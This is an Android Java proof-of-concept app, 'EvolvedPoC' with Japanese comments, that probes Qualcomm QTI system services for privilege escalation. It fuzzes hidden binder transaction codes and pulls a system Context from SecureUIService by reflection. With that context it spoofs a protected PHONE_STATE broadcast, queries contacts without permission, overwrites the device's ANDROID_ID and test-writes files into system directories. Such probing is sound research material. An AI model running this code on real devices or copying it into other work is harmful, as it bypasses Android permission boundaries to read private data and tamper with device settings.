package com.example.tzpoc;

import android.Manifest;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "EvolvedPoC";
    private static final String TARGET_PKG_CS = "com.qualcomm.qti.qms.service.connectionsecurity";
    private static final String TARGET_CLS_CS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";
    private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
    private static final String TEST_DATA = "POC_WRITE_TEST_DATA_12345";
    private static final String TEST_FILENAME = "poc_write_test.tmp";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    // サービスバインド用
    private IServiceManager mServiceManager;
    private IBinder mTZServiceBinder;
    private boolean isBoundCS = false;
    private boolean isBoundTZ = false;
    private ServiceConnection csConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mServiceManager = IServiceManager.Stub.asInterface(service);
            appendLog("CS Service bound");
            if (mTZServiceBinder != null) startTests();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mServiceManager = null;
            isBoundCS = false;
            enableButtons(true, false);
            updateStatus("CS disconnected");
        }
    };
    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mTZServiceBinder = service;
            appendLog("TZ Service bound");
            if (mServiceManager != null) startTests();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mTZServiceBinder = null;
            isBoundTZ = false;
            enableButtons(true, false);
            updateStatus("TZ disconnected");
        }
    };

    // SecureUI から取得したシステムコンテキスト
    private Context systemContext;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                // SecureUI のシステムコンテキストを取得
                acquireSystemContext();
                // CS/TZ サービスにバインド（失敗しても続行）
                bindServices();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_FINE_LOCATION
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void acquireSystemContext() {
        try {
            Class<?> clazz = Class.forName("com.qualcomm.qti.services.secureui.SecureUIService");
            Field contextField = clazz.getDeclaredField("context");
            contextField.setAccessible(true);
            systemContext = (Context) contextField.get(null);
            if (systemContext != null) {
                appendLog("SystemContext acquired via reflection");
            } else {
                appendLog("SystemContext is null");
            }
        } catch (Exception e) {
            appendLog("Failed to acquire SystemContext: " + e.getMessage());
            systemContext = null;
        }
    }

    private void bindServices() {
        try {
            Intent intentCS = new Intent();
            intentCS.setClassName(TARGET_PKG_CS, TARGET_CLS_CS);
            isBoundCS = bindService(intentCS, csConnection, Context.BIND_AUTO_CREATE);
            if (!isBoundCS) appendLog("CS bind failed");

            Intent intentTZ = new Intent();
            intentTZ.setClassName(TARGET_PKG_TZ, TARGET_CLS_TZ);
            isBoundTZ = bindService(intentTZ, tzConnection, Context.BIND_AUTO_CREATE);
            if (!isBoundTZ) appendLog("TZ bind failed");

            if (!isBoundCS && !isBoundTZ) {
                appendLog("Service bind failed, but continuing with SecureUI tests");
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
        }
        // すぐにテスト開始（サービスが後からバインドされたら startTests が再呼び出しされる）
        if (!isBoundCS && !isBoundTZ) {
            startTests();
        }
    }

    private void startTests() {
        if (testThread != null && testThread.isAlive()) return;
        testThread = new Thread(() -> executeFullTest());
        testThread.start();
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        // Phase 1: CS Service Enumeration
        appendLog("========== PHASE 1: CS Service Enumeration ==========");
        if (mServiceManager != null) {
            IBinder rticBinder = getService("rtic");
            if (rticBinder != null) {
                IRticService rtic = IRticService.Stub.asInterface(rticBinder);
                testRticFlags(rtic);
                discoverMethods(rticBinder, "IRticService");
            }
            IBinder tlocBinder = getService("tloc");
            if (tlocBinder != null) {
                ITlocService tloc = ITlocService.Stub.asInterface(tlocBinder);
                testTloc(tloc);
                discoverMethods(tlocBinder, "ITlocService");
                testTlocHiddenMethod(tlocBinder);
            }
        }

        // Phase 2: TZAccess Socket Connect (Reflection)
        appendLog("========== PHASE 2: TZAccess Socket Connect ==========");
        if (mTZServiceBinder != null) {
            tryConnectViaTZReflect("/dev/socket/minksocket");
            tryConnectViaTZReflect("/dev/socket/ssgqmig");
        }

        // Phase 3: Deep File System Exploration (original)
        appendLog("========== PHASE 3: Deep File System Exploration ==========");
        exploreDeepFiles();

        // Phase 4: Settings Manipulation (normal)
        appendLog("========== PHASE 4: Settings Manipulation ==========");
        testSettingsWrite();

        // Phase 5: SecureUI SystemContext を活用した高度な検証
        appendLog("========== PHASE 5: SecureUI SystemContext Advanced Tests ==========");
        if (systemContext != null) {
            testSystemContextBroadcast();
            testSystemContextStartActivity();
            testSystemContextContentProvider();
            testSystemContextWriteSecureSettings();
            testSystemContextFileWrite();
        } else {
            appendLog("SystemContext not available, skipping SecureUI advanced tests");
        }

        // Phase 6: 書き込み検証（従来のファイル書き込みテスト、systemContextを使ったものと重複するが残す）
        appendLog("========== PHASE 6: Write Verification via SystemContext ==========");
        if (systemContext != null) {
            performWriteVerification();
        } else {
            appendLog("SystemContext not available, skipping write verification");
        }

        appendLog("========== ALL TESTS COMPLETED ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
    }

    // ---------- 以下、各テストメソッド ----------

    private IBinder getService(String serviceName) {
        if (mServiceManager == null) return null;
        try {
            int[] status = new int[1];
            IBinder binder = mServiceManager.getService(serviceName, new byte[0], status);
            if (binder != null) {
                appendLog("Got " + serviceName + " binder, status=" + status[0]);
                return binder;
            } else {
                appendLog("Failed to get " + serviceName + ", status=" + status[0]);
                return null;
            }
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
            return null;
        }
    }

    private void testRticFlags(IRticService rtic) {
        appendLog("--- Testing RTIC with flags ---");
        long[] flags = {0, 8, 32, 64, 2147483648L, 8|32, 8|64, 32|64, 8|32|64};
        for (long flag : flags) {
            try {
                int[] status = new int[1];
                int[] ret = new int[1];
                byte[] data = rtic.getRticData(flag, status, ret, false);
                appendLog("Flag " + flag + " -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
            } catch (RemoteException e) {
                appendLog("RemoteException for flag " + flag + ": " + e.getMessage());
            }
        }
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            byte[] data = rtic.getRticData(0, status, ret, true);
            appendLog("z=true -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
        }
    }

    private void testTloc(ITlocService tloc) {
        appendLog("--- Testing ITlocService ---");
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            byte[] data = tloc.getTrustedLocation(status, ret);
            appendLog("getTrustedLocation -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
            int warmup = tloc.tlocWarmUp();
            appendLog("tlocWarmUp returned: " + warmup);
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
        }
    }

    private void testTlocHiddenMethod(IBinder binder) {
        appendLog("--- Testing hidden method (code 2) of ITlocService ---");
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(binder.getInterfaceDescriptor());
            data.writeInt(123);
            data.writeString("test");
            boolean success = binder.transact(2, data, reply, 0);
            if (success) {
                appendLog("Hidden method call succeeded, reply size=" + reply.dataSize());
                reply.setDataPosition(0);
                try {
                    int result = reply.readInt();
                    appendLog("  readInt: " + result);
                } catch (Exception e) {}
                try {
                    String s = reply.readString();
                    appendLog("  readString: " + s);
                } catch (Exception e) {}
            } else {
                appendLog("Hidden method call failed");
            }
        } catch (Exception e) {
            appendLog("Hidden method error: " + e.getMessage());
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    private void discoverMethods(IBinder binder, String name) {
        appendLog("--- Discovering hidden methods for " + name + " ---");
        for (int code = 1; code <= 30; code++) {
            if (stopRequested.get()) break;
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(binder.getInterfaceDescriptor());
                boolean success = binder.transact(code, data, reply, 0);
                if (success) {
                    appendLog("Method " + code + " succeeded, reply size=" + reply.dataSize());
                    reply.setDataPosition(0);
                    try {
                        int result = reply.readInt();
                        appendLog("  readInt: " + result);
                    } catch (Exception e) {}
                } else {
                    appendLog("Method " + code + " failed");
                }
            } catch (Exception e) {
                appendLog("Method " + code + " threw: " + e.getClass().getSimpleName());
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
    }

    private void tryConnectViaTZReflect(String path) {
        appendLog("Trying TZAccess connect to " + path + " via reflection");
        if (mTZServiceBinder == null) {
            appendLog("  TZ binder null");
            return;
        }
        try {
            Class<?> cls = Class.forName("com.qualcomm.qti.qms.api.a.IMinkSocketFd");
            Method asInterface = cls.getMethod("asInterface", IBinder.class);
            Object proxy = asInterface.invoke(null, mTZServiceBinder);
            Method aMethod = cls.getMethod("a", String.class, int[].class);
            int[] iArr = new int[1];
            ParcelFileDescriptor pfd = (ParcelFileDescriptor) aMethod.invoke(proxy, path, iArr);
            if (pfd != null) {
                appendLog("  Got FD: " + iArr[0] + " for " + path);
                pfd.close();
            } else {
                appendLog("  Failed to get FD for " + path);
            }
        } catch (ClassNotFoundException e) {
            appendLog("  IMinkSocketFd class not found. TZAccess may not be using this interface.");
        } catch (Exception e) {
            appendLog("  TZ connect error: " + e.getMessage());
        }
    }

    private void exploreDeepFiles() {
        appendLog("--- Deep File System Exploration ---");
        String[] additionalProc = {
                "/proc/self/fd",
                "/proc/self/cwd",
                "/proc/self/root",
                "/proc/self/maps",
                "/proc/self/smaps",
                "/proc/self/oom_adj",
                "/proc/self/oom_score",
                "/proc/self/comm",
                "/proc/self/auxv",
                "/proc/self/limits",
                "/proc/self/sched",
                "/proc/self/stack",
                "/proc/self/statm",
                "/proc/self/wchan",
                "/proc/self/pagemap",
                "/proc/self/clear_refs",
                "/proc/self/timers",
                "/proc/self/attr/current",
                "/proc/self/loginuid",
                "/proc/self/sessionid",
                "/proc/self/cgroup"
        };
        for (String p : additionalProc) {
            if (stopRequested.get()) break;
            readFileContent(p);
        }

        String[] sysFiles = {
                "/system/build.prop",
                "/system/etc/hosts",
                "/system/etc/security/cacerts/",
                "/vendor/build.prop",
                "/proc/version"
        };
        for (String p : sysFiles) {
            if (stopRequested.get()) break;
            readFileContent(p);
        }

        File tmpDir = new File("/data/local/tmp");
        if (tmpDir.exists() && tmpDir.canRead()) {
            appendLog("Reading /data/local/tmp contents:");
            File[] children = tmpDir.listFiles();
            if (children != null) {
                for (File f : children) {
                    appendLog("  " + f.getName());
                }
            }
        } else {
            appendLog("/data/local/tmp not readable");
        }

        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (download.exists() || download.mkdirs()) {
            File testFile = new File(download, "poc_write_test.txt");
            try (FileOutputStream fos = new FileOutputStream(testFile)) {
                fos.write("Deep exploration test\n".getBytes(StandardCharsets.UTF_8));
                appendLog("Write to " + testFile.getAbsolutePath() + " succeeded");
            } catch (Exception e) {
                appendLog("Write failed: " + e.getMessage());
            }
        }
    }

    private void readFileContent(String path) {
        File f = new File(path);
        if (!f.exists()) {
            appendLog(path + " does not exist");
            return;
        }
        if (!f.canRead()) {
            appendLog(path + " not readable");
            return;
        }
        if (f.isDirectory()) {
            appendLog(path + " is a directory, listing contents:");
            File[] children = f.listFiles();
            if (children != null) {
                for (File child : children) {
                    appendLog("  " + child.getName());
                }
            }
            return;
        }
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] data = new byte[4096];
            int len = fis.read(data);
            if (len > 0) {
                String content = new String(data, 0, len, StandardCharsets.UTF_8);
                appendLog("Content of " + path + ": " + content);
            } else {
                appendLog("Empty file: " + path);
            }
        } catch (Exception e) {
            appendLog("Error reading " + path + ": " + e.getMessage());
        }
    }

    private void testSettingsWrite() {
        appendLog("--- Normal Settings Write (without system context) ---");
        try {
            String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
            appendLog("Current hidden_api_blacklist_exemptions: " + current);
            boolean success = Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", "test");
            if (success) {
                appendLog("WRITE_SECURE_SETTINGS succeeded!");
                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", current);
            } else {
                appendLog("WRITE_SECURE_SETTINGS failed");
            }
        } catch (Exception e) {
            appendLog("Settings error: " + e.getMessage());
        }
    }

    // ========== SecureUI SystemContext を利用した高度なテスト ==========

    private void testSystemContextBroadcast() {
        appendLog("--- Sending broadcast with SystemContext ---");
        try {
            Intent intent = new Intent("com.qualcomm.qti.services.secureui.ACTION_CLOSE");
            intent.setPackage("com.qualcomm.qti.services.secureui");
            systemContext.sendBroadcast(intent);
            appendLog("Broadcast ACTION_CLOSE sent (may trigger OrientationActivity close)");
        } catch (Exception e) {
            appendLog("Broadcast send failed: " + e.getMessage());
        }

        // 電話状態偽装（保護されているため通常はSecurityException）
        try {
            Intent phoneIntent = new Intent("android.intent.action.PHONE_STATE");
            phoneIntent.putExtra("state", "RINGING");
            systemContext.sendBroadcast(phoneIntent);
            appendLog("Fake PHONE_STATE broadcast sent");
        } catch (Exception e) {
            appendLog("PHONE_STATE broadcast failed: " + e.getMessage());
        }
    }

    private void testSystemContextStartActivity() {
        appendLog("--- Starting activity with SystemContext ---");
        try {
            // システム設定アプリを起動（権限昇格の可否）
            Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
            settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            systemContext.startActivity(settingsIntent);
            appendLog("Settings activity started using SystemContext");
        } catch (Exception e) {
            appendLog("StartActivity failed: " + e.getMessage());
        }
    }

    private void testSystemContextContentProvider() {
        appendLog("--- Querying ContentProvider with SystemContext ---");
        ContentResolver cr = systemContext.getContentResolver();
        // 問い合わせ：設定データベース
        try (Cursor c = cr.query(Settings.Global.CONTENT_URI, null, null, null, null)) {
            if (c != null) {
                appendLog("Settings.Global query succeeded, count=" + c.getCount());
                c.close();
            } else {
                appendLog("Settings.Global query returned null");
            }
        } catch (Exception e) {
            appendLog("Settings.Global query error: " + e.getMessage());
        }

        // 連絡先（READ_CONTACTS 権限がなくてもシステム権限なら可能？）
        try (Cursor c = cr.query(Uri.parse("content://contacts/people"), null, null, null, null)) {
            if (c != null) {
                appendLog("Contacts query succeeded, count=" + c.getCount());
                c.close();
            } else {
                appendLog("Contacts query returned null");
            }
        } catch (Exception e) {
            appendLog("Contacts query error: " + e.getMessage());
        }
    }

    private void testSystemContextWriteSecureSettings() {
        appendLog("--- Writing Secure Settings with SystemContext ---");
        try {
            // WRITE_SECURE_SETTINGS は通常アプリでは不可だが、SystemContext経由で可能か確認
            boolean result = Settings.Secure.putString(systemContext.getContentResolver(),
                    Settings.Secure.ANDROID_ID, "POC_TEST_ID");
            appendLog("Write to Secure.ANDROID_ID result: " + result);
            // 元に戻す（失敗するかも）
            Settings.Secure.putString(systemContext.getContentResolver(),
                    Settings.Secure.ANDROID_ID, Build.SERIAL); // 仮
        } catch (Exception e) {
            appendLog("Write Secure Settings error: " + e.getMessage());
        }
    }

    private void testSystemContextFileWrite() {
        appendLog("--- File write test using SystemContext (indirect) ---");
        // SystemContext 自体はファイル書き込みに直接使えないが、getContentResolver().openOutputStream() 等を試す
        try {
            ContentResolver cr = systemContext.getContentResolver();
            // 外部ストレージへの書き込み（Downloadディレクトリ）
            File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File testFile = new File(download, "systemcontext_write_test.txt");
            Uri fileUri = Uri.fromFile(testFile);
            try (java.io.OutputStream os = cr.openOutputStream(fileUri)) {
                if (os != null) {
                    os.write("Written via SystemContext".getBytes(StandardCharsets.UTF_8));
                    appendLog("File write via SystemContext succeeded: " + testFile.getAbsolutePath());
                } else {
                    appendLog("openOutputStream returned null");
                }
            } catch (Exception e) {
                appendLog("File write via SystemContext failed: " + e.getMessage());
            }
        } catch (Exception e) {
            appendLog("SystemContext file write setup error: " + e.getMessage());
        }
    }

    // ========== 書き込み検証（元のPoC） ==========

    private void performWriteVerification() {
        appendLog("--- Write Verification (FileOutputStream direct) ---");
        String[] targetDirs = {
                "/data/local/tmp",
                "/data/misc",
                "/data/system",
                "/data/data",
                "/cache",
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(),
                "/dev",
                "/proc",
                "/sys",
                "/system",
                "/"
        };
        for (String dirPath : targetDirs) {
            if (stopRequested.get()) break;
            File dir = new File(dirPath);
            if (!dir.exists()) {
                appendLog("Directory " + dirPath + " does not exist, skipping");
                continue;
            }
            File testFile = new File(dir, TEST_FILENAME);
            boolean writeOk = writeFile(testFile, TEST_DATA);
            boolean verifyOk = false;
            boolean deleteOk = false;
            if (writeOk) {
                verifyOk = verifyFile(testFile, TEST_DATA);
                if (verifyOk) {
                    deleteOk = testFile.delete();
                }
            }
            appendLog(String.format(Locale.US,
                    "Dir: %s | canWrite=%b | write=%b | verify=%b | delete=%b",
                    dirPath, dir.canWrite(), writeOk, verifyOk, deleteOk));
        }
    }

    private boolean writeFile(File file, String data) {
        try {
            File parent = file.getParentFile();
            if (parent != null && !parent.exists()) {
                parent.mkdirs();
            }
            try (FileOutputStream fos = new FileOutputStream(file)) {
                fos.write(data.getBytes(StandardCharsets.UTF_8));
                fos.flush();
                return true;
            }
        } catch (Exception e) {
            Log.w(TAG, "Write failed for " + file.getAbsolutePath() + ": " + e.getMessage());
            return false;
        }
    }

    private boolean verifyFile(File file, String expected) {
        if (!file.exists()) return false;
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] buffer = new byte[expected.length() + 10];
            int len = fis.read(buffer);
            if (len <= 0) return false;
            String actual = new String(buffer, 0, len, StandardCharsets.UTF_8);
            return expected.equals(actual);
        } catch (Exception e) {
            Log.w(TAG, "Verify failed for " + file.getAbsolutePath() + ": " + e.getMessage());
            return false;
        }
    }

    // ========== ログとUI ==========

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "final_evolved_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== Final Evolved PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBoundCS) unbindService(csConnection);
        if (isBoundTZ) unbindService(tzConnection);
        saveLog();
    }
}
